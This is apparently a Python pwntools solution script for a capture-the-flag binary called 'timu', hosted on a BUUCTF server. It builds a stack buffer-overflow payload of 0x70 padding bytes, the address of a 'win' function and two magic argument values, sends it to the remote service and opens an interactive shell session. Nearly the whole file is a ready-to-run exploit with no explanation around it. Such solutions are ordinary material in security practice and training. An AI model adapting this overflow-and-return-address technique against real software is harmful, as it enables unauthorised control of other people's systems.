from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",26287)
elf=ELF("./timu")

a1=0xDEADBEEF
a2=0xDEADC0DE
win=0x080485CB
payload=0x70*b'a'+p32(win)+p32(0xdeadbeef)+p32(a1)+p32(a2)
sh.sendline(payload)

sh.interactive()
